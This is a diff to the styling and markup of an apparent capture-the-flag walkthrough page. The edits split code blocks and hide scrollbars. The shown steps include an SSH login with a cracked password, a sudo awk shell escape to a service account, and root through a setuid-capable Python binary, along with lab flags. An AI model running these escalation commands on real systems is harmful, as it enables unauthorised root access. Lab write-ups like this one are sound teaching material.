@@ -74,7 +74,8 @@ table{width:100%;border-collapse:collapse;margin:6px 0 2px}
 th,td{text-align:left;padding:9px 10px;border-bottom:1px solid var(--line);font-size:.94rem;vertical-align:top}
 th{color:var(--muted);font-weight:700;font-size:.82rem;text-transform:uppercase;letter-spacing:.03em}
 pre{position:relative;background:var(--code);color:var(--codeink);padding:14px 16px;border-radius:14px;overflow-x:auto;margin:12px 0;
-  font:13.5px/1.6 ui-monospace,Menlo,Consolas,monospace;max-width:100%;border:1px solid var(--line);border-left:4px solid var(--accent2);cursor:copy}
+  font:13.5px/1.6 ui-monospace,Menlo,Consolas,monospace;max-width:100%;border:1px solid var(--line);border-left:4px solid var(--accent2);cursor:copy;scrollbar-width:none}
+pre::-webkit-scrollbar{display:none}
 pre code{background:none;padding:0;color:inherit}
 code{font:0.9em ui-monospace,Menlo,Consolas,monospace;background:var(--why);padding:1px 6px;border-radius:6px;color:var(--ink)}
 pre .c{color:var(--muted)}
@@ -96,7 +97,7 @@ pre:hover .copy,.copy:focus-visible{opacity:.9}
 .why li{margin:5px 0}
 .lesson{color:var(--muted)}
 .side{display:none}
-@media (min-width:1180px){
+@media (min-width:1240px){
   .side{display:block;position:fixed;top:calc(env(safe-area-inset-top,0px) + 96px);left:calc(50% - 390px - 212px);width:190px;box-sizing:border-box;padding:15px;border-radius:18px;background:var(--card);border:1px solid var(--line);box-shadow:var(--shadow);z-index:4}
   .side h2{font-family:"Bricolage Grotesque",system-ui,sans-serif;font-size:1.02rem;margin:0 0 10px}
   .side .chips{display:grid;grid-template-columns:repeat(5,1fr);gap:6px}
@@ -203,8 +204,8 @@ mbrown : chocolate</pre>
 <div class="card flagcard" id="s4">
   <div class="chead"><span class="num">4</span><h3>Access &rarr; user</h3></div>
   <div class="skill">using credentials</div>
-<pre>$ ssh mbrown@&lt;target-ip&gt;       <span class="c"># chocolate</span>
-$ cat /home/mbrown/user.txt
+<pre>$ ssh mbrown@&lt;target-ip&gt;       <span class="c"># chocolate</span></pre>
+<pre>$ cat /home/mbrown/user.txt
 <span class="f">FLAG{sqli_dump_crack_login}</span></pre>
   <span class="flag"><span class="fl">user</span>FLAG{sqli_dump_crack_login}</span>
   <div class="why"><h4>Why it works</h4>
@@ -215,9 +216,9 @@ $ cat /home/mbrown/user.txt
   <div class="chead"><span class="num">5</span><h3>Pivot mbrown &rarr; svc</h3></div>
   <div class="skill">sudo abuse (GTFOBins)</div>
 <pre>$ sudo -l
-    (svc) NOPASSWD: /usr/bin/awk
-$ sudo -u svc /usr/bin/awk 'BEGIN{system("/bin/sh")}'
-$ whoami
+    (svc) NOPASSWD: /usr/bin/awk</pre>
+<pre>$ sudo -u svc /usr/bin/awk 'BEGIN{system("/bin/sh")}'</pre>
+<pre>$ whoami
 svc</pre>
   <div class="why"><h4>Why it works</h4>
     <ul><li>mbrown may run <code>awk</code> as <code>svc</code> without a password, and <code>awk</code>'s <code>system()</code> spawns a shell.</li></ul></div>
@@ -227,8 +228,8 @@ svc</pre>
   <div class="chead"><span class="num">6</span><h3>svc &rarr; root (capability)</h3></div>
   <div class="skill">Linux capabilities</div>
 <pre>$ getcap -r / 2&gt;/dev/null
-/usr/local/bin/python3cap cap_setuid=ep
-$ /usr/local/bin/python3cap -c 'import os; os.setuid(0); os.system("/bin/bash")'
+/usr/local/bin/python3cap cap_setuid=ep</pre>
+<pre>$ /usr/local/bin/python3cap -c 'import os; os.setuid(0); os.system("/bin/bash")'
 # cat /root/root.txt
 <span class="f">FLAG{c4p_s3tu1d_pyth0n_r00t}</span></pre>
   <span class="flag root"><span class="fl">root</span>FLAG{c4p_s3tu1d_pyth0n_r00t}</span>
